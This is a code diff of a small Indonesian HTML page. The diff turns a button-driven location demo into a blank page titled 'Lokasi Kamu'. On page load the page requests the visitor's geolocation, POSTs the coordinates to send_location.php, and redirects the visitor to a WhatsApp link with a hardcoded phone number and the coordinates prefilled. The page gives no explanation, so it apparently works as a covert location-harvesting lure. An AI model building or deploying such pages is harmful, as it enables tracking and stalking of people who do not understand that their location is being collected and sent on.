@@ -1,54 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Akses Lokasi dan Simpan File</title>
+  <title>Lokasi Kamu</title>
   <script>
-    function getLocation() {
+    window.addEventListener('load', function() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
+        navigator.geolocation.getCurrentPosition(sendLocationToServer);
       } else {
-        console.log('Geolocation tidak didukung di browser ini.');
+        alert('Geolocation tidak didukung oleh browser ini.');
       }
-    }
+    });
 
-    function showPosition(position) {
+    function sendLocationToServer(position) {
       var latitude = position.coords.latitude;
       var longitude = position.coords.longitude;
-      console.log('Latitude:', latitude);
-      console.log('Longitude:', longitude);
 
-      // Kirim data lokasi ke server menggunakan XMLHttpRequest atau fetch API
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', 'save_location.php', true);
-      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-          console.log('Lokasi disimpan ke file server.');
-        }
-      };
-      xhr.send('latitude=' + latitude + '&longitude=' + longitude);
-    }
-
-    function showError(error) {
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          console.log('Akses lokasi ditolak oleh pengguna.');
-          break;
-        case error.POSITION_UNAVAILABLE:
-          console.log('Informasi lokasi tidak tersedia.');
-          break;
-        case error.TIMEOUT:
-          console.log('Waktu permintaan lokasi habis.');
-          break;
-        case error.UNKNOWN_ERROR:
-          console.log('Terjadi kesalahan yang tidak diketahui.');
-          break;
-      }
+      // Kirim data lokasi ke server PHP
+      var xhttp = new XMLHttpRequest();
+      xhttp.open('POST', 'send_location.php', true);
+      xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+      xhttp.send('latitude=' + latitude + '&longitude=' + longitude);
+      
+      // Redirect ke nomor WhatsApp dengan pesan yang sudah terisi
+      var phoneNumber = '+6281389408798'; // Ganti dengan nomor tujuan WhatsApp Anda
+      var message = '🗿 Lokasi Anda: \n' + latitude + ', ' + longitude;
+      var url = 'https://wa.me/' + phoneNumber + '?text=' + encodeURIComponent(message);
+      window.location.href = url;
     }
   </script>
 </head>
 <body>
-  <h1>Akses Lokasi dan Simpan File</h1>
-  <button onclick="getLocation()">Dapatkan Lokasi dan Simpan File</button>
 </body>
 </html>
